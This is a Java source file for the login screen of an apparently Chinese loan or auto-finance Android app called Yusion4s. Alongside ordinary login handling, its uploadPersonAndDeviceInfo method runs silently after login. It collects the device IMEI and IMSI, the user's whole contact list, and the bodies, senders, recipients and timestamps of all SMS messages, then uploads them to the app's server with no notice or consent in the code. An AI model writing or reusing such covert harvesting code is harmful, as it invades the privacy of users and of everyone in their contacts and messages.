package com.yusion.shanghai.yusion4s.ui.entrance;

import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import com.yusion.shanghai.yusion4s.R;
import com.yusion.shanghai.yusion4s.Yusion4sApp;
import com.yusion.shanghai.yusion4s.base.ActivityManager;
import com.yusion.shanghai.yusion4s.base.BaseActivity;
import com.yusion.shanghai.yusion4s.bean.auth.CheckUserInfoResp;
import com.yusion.shanghai.yusion4s.bean.login.LoginReq;
import com.yusion.shanghai.yusion4s.bean.login.LoginResp;
import com.yusion.shanghai.yusion4s.retrofit.api.AuthApi;
import com.yusion.shanghai.yusion4s.retrofit.api.ConfigApi;
import com.yusion.shanghai.yusion4s.retrofit.api.PersonApi;
import com.yusion.shanghai.yusion4s.retrofit.callback.OnItemDataCallBack;
import com.yusion.shanghai.yusion4s.ubt.bean.UBTData;
import com.yusion.shanghai.yusion4s.ui.MainActivity;
import com.yusion.shanghai.yusion4s.ui.order.ApplyProcessActivity;
import com.yusion.shanghai.yusion4s.utils.MobileDataUtil;
import com.yusion.shanghai.yusion4s.utils.SharedPrefsUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;


public class LoginActivity extends BaseActivity {

    private EditText mLoginAccountTV;
    private EditText mLoginPasswordTV;
    private ImageView mLoginPasswordEyeImg;
    private boolean isShowPassword = false;
    private TelephonyManager telephonyManager;
    private Yusion4sApp yusion4sApp;
    private Button button;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        initView();

    }

    private void initView() {
        findViewById(R.id.btnnnnnn).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent intent = new Intent(LoginActivity.this, ApplyProcessActivity.class);
                startActivity(intent);
            }
        });
        yusion4sApp = (Yusion4sApp) getApplication();
        yusion4sApp.requestLocation(null);
        telephonyManager = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        mLoginAccountTV = (EditText) findViewById(R.id.login_account_edt);
        mLoginPasswordTV = (EditText) findViewById(R.id.login_password_edt);
        mLoginPasswordEyeImg = (ImageView) findViewById(R.id.login_password_eye_img);
        mLoginPasswordEyeImg.setOnClickListener(v -> {
            if (isShowPassword) {
                //隐藏密码
                isShowPassword = false;
                mLoginPasswordEyeImg.setImageResource(R.mipmap.password_hide);
                mLoginPasswordTV.setInputType(EditorInfo.TYPE_CLASS_TEXT | EditorInfo.TYPE_TEXT_VARIATION_PASSWORD);
            } else {
                isShowPassword = true;
                mLoginPasswordEyeImg.setImageResource(R.mipmap.password_show);
                mLoginPasswordTV.setInputType(EditorInfo.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD);
            }
        });
        findViewById(R.id.login_submit_btn).setOnClickListener(v -> {
//            Intent i = new Intent(LoginActivity.this, SubmitInformationActivity.class);
//            startActivityForResult(i, 100);

            LoginReq req = new LoginReq();
            String account = mLoginAccountTV.getText().toString();
            String password = mLoginPasswordTV.getText().toString();
            if (TextUtils.isEmpty(account)) {
                Toast.makeText(myApp, "账号不能为空!", Toast.LENGTH_SHORT).show();
                return;
            } else if (TextUtils.isEmpty(password)) {
                Toast.makeText(myApp, "密码不能为空!", Toast.LENGTH_SHORT).show();
                return;
            }
            req.username = account;
            req.password = password;
            req.reg_id = SharedPrefsUtil.getInstance(LoginActivity.this).getValue("reg_id", "");
            AuthApi.login(this, req, this::loginSuccess);
        });
    }

    private void loginSuccess(LoginResp resp) {
        Yusion4sApp.isLogin = true;
        if (resp != null) {
            Yusion4sApp.TOKEN = resp.token;
//            Yusion4sApp.MOBILE = resp.mobile;
            Yusion4sApp.ACCOUNT = mLoginAccountTV.getText().toString();
            SharedPrefsUtil.getInstance(LoginActivity.this).putValue("token", Yusion4sApp.TOKEN);
            SharedPrefsUtil.getInstance(LoginActivity.this).putValue("mobile", Yusion4sApp.ACCOUNT);
            SharedPrefsUtil.getInstance(LoginActivity.this).putValue("account", Yusion4sApp.ACCOUNT);
            startActivity(new Intent(LoginActivity.this, MainActivity.class));
            Toast.makeText(LoginActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
            // finish();
            //上传设备信息

            new Thread(new Runnable() {
                @Override
                public void run() {
                    //UBT.uploadPersonAndDeviceInfo(LoginActivity.this);
                    uploadPersonAndDeviceInfo();
                }
            }).start();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        Yusion4sApp.isLogin = false;
        myApp.clearUserData();

        ConfigApi.getConfigJson(LoginActivity.this, null);
    }

    @Override
    public void onBackPressed() {
        super.onBackPressed();
        ActivityManager.finishOtherActivityEx(LoginActivity.class);
    }

    private void uploadPersonAndDeviceInfo() {
        UBTData req = new UBTData(this);
        String imei = telephonyManager.getDeviceId();
        String imsi = telephonyManager.getSubscriberId();
        req.imei = imei;
        req.imsi = imsi;
        req.app = "Yusion4s";
        req.token = SharedPrefsUtil.getInstance(this).getValue("token", null);
        req.mobile = SharedPrefsUtil.getInstance(this).getValue("account", null);

        JSONArray contactJsonArray = MobileDataUtil.getUserData(this, "contact");
        List<UBTData.DataBean.ContactBean> contactBeenList = new ArrayList<>();

        for (int i = 0; i < contactJsonArray.length(); i++) {
            JSONObject jsonObject = null;
            try {
                jsonObject = contactJsonArray.getJSONObject(i);
                UBTData.DataBean.ContactBean contactListBean = new UBTData.DataBean.ContactBean();

                contactListBean.data1 = jsonObject.optString("data1");
                contactListBean.display_name = jsonObject.optString("display_name");

                contactBeenList.add(contactListBean);
                //raw_list.add(jsonObject.toString());

            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        UBTData.DataBean contactBean = new UBTData.DataBean();
        contactBean.category = "contact";
        req.data.add(contactBean);
        if (contactBeenList.size() > 0 && !contactBeenList.isEmpty()) {
            contactBean.contact_list = contactBeenList;
        }
//        else {
//            contactBean.raw_data = raw_list;
//        }

        JSONArray smsJsonArray = MobileDataUtil.getUserData(this, "sms");
        List<UBTData.DataBean.SmsBean> smsList = new ArrayList<>();
        for (int i = 0; i < smsJsonArray.length(); i++) {
            JSONObject jsonObject = null;
            try {
                jsonObject = smsJsonArray.getJSONObject(i);
                UBTData.DataBean.SmsBean smsListBean = new UBTData.DataBean.SmsBean();
                String type = jsonObject.optString("type");
                if (type.equals("1")) {
                    smsListBean.from = jsonObject.optString("address");
                    smsListBean.content = jsonObject.optString("body");
                    smsListBean.type = "recv";
                    smsListBean.ts = jsonObject.optString("date");
                } else if (type.equals("2")) {
                    smsListBean.to = jsonObject.optString("address");
                    smsListBean.content = jsonObject.optString("body");
                    smsListBean.type = "snd";
                    smsListBean.ts = jsonObject.optString("date");//date
                }
                smsList.add(smsListBean);
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }

        UBTData.DataBean simBean = new UBTData.DataBean();
        simBean.category = "sms";
        req.data.add(simBean);
        if (smsList.size() > 0 && !smsList.isEmpty()) {
            simBean.sms_list = smsList;
        }

        AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
            @Override
            public void onItemDataCallBack(CheckUserInfoResp data) {
                contactBean.clt_nm = data.name;
                contactBean.mobile = data.mobile;
                simBean.clt_nm = data.name;
                simBean.mobile = data.mobile;
                //PersonApi.uploadPersonAndDeviceInfo(req);
                PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
                    @Override
                    public void onResponse(Call call, Response response) {

                        finish();
                    }

                    @Override
                    public void onFailure(Call call, Throwable t) {

                    }
                });
            }
        });
//        Intent intent = new Intent(LoginActivity.this, MainActivity.class);
//        startActivity(intent);
//        finish();
    }

}
